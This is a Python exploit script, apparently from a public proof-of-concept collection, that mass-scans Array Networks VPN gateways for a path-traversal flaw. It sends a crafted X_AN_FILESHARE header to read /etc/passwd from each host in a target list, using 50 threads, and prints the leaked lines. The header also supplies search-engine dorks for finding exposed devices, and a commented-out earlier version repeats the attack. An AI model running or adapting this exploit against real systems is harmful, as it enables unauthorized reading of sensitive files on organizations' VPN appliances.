#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
#fofa：product="Array-VPN"
#zoomeye:app:"Array Networks secure access gateways VPN server httpd" +country:"CN"
import poplib
from HackRequests import *

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
import ssl


# if len(sys.argv) != 2:
#     print(
#         '+----------------------------------------------------------------------------------------------------------+')
#     print(
#         '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
#     print(
#         '+----------------------------------------------------------------------------------------------------------+')
#     print(
#         '+ USE: python3 <filename> <hosts.txt>                                                                      +')
#     print(
#         '+ EXP: python3 Array_VPN_FileRead_Poc.py url.txt                                               +')
#     print(
#         '+----------------------------------------------------------------------------------------------------------+')
#     sys.exit()
# requests.packages.urllib3.disable_warnings()

# def exp(host):
#     if "http" in host:
#         url = host
#     else:
#         url ="http://"+host
#     host1=url.replace("http://","")
#     host2=host1.replace("https://","")
#     headers = {
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
#         "Sec-Fetch-Mode": "no-cors",
#         "Host": "%s" %host2,
#         "Sec-Ch-Ua": '"Chromium";v="103", ".Not/A)Brand";v="99"',
#         "Accept": "*/*",
#         "Accept-Encoding": "gzip, deflate",
#         "Sec-Fetch-Dest": "script",
#         "Sec-Ch-Ua-Platform": "\"Windows\"",
#         "Sec-Fetch-Mode": "no-cors",
#         "X_AN_FILESHARE": "uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd"
#     }
#     raw='''GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
# Accept-Encoding: gzip, deflate, br
# Accept: */*
# Connection: close
# Sec-Fetch-Mode: no-cors
# Host: 223.255.133.5
# Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
# Sec-Fetch-Dest: script
# Sec-Ch-Ua-Platform: "Windows"
# X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd'''
#     vulurl=url+"/prx/000/http/localhost/client_sec/%00../../../addfolder"
#     try:
#         uu = hackRequests().http(vulurl, headers=headers)
#         print(uu.text())
#     except  Exception as e:
#         print (e)
#         print (host+":false")
# if __name__ == '__main__':
#     file = sys.argv[1]
#     data = open(file)
#     reader = csv.reader(data)
#     with ThreadPoolExecutor(50) as pool:
#         for row in reader:
#             pool.submit(exp, row[0])
proxysdata = {
'https': '127.0.0.1:8082'
}
requests.packages.urllib3.disable_warnings()
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Sec-Fetch-Mode": "no-cors",
        "Host": "%s" %host2,
        "Sec-Ch-Ua": '"Chromium";v="103", ".Not/A)Brand";v="99"',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Dest": "script",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Mode": "no-cors",
        "X_AN_FILESHARE": "uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd"
    }
    vulurl=url+"""/prx/000/http/localhost/client_sec/%25%30%30%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%64%64%66%6f%6c%64%65%72"""
    try:
        r=requests.get(vulurl,headers=headers,verify=False)
        if "arraydb" in r.text:
            print(url+":true     "+r.text[r.text.find('root'):r.text.find('sh')+2])
    except  Exception as e:
        return 0
        print (e)
        print (host+":false")
if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])